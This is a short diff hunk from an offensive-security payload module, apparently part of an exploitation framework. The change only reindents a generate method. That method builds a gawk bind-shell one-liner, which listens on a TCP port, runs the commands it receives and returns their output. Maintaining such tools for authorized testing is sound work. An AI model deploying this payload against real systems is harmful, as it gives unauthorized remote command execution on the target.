@@ -15,9 +15,9 @@ class Payload(BindTCPPayloadMixin, GenericPayload):
 
     def generate(self):
         return (
-            self.cmd +
-            " 'BEGIN{s=\"/inet/tcp/" +
-            str(self.rport) +
-            "/0/0\";for(;s|&getline c;close(c))" +
-            "while(c|getline)print|&s;close(s)}'"
+                self.cmd +
+                " 'BEGIN{s=\"/inet/tcp/" +
+                str(self.rport) +
+                "/0/0\";for(;s|&getline c;close(c))" +
+                "while(c|getline)print|&s;close(s)}'"
         )
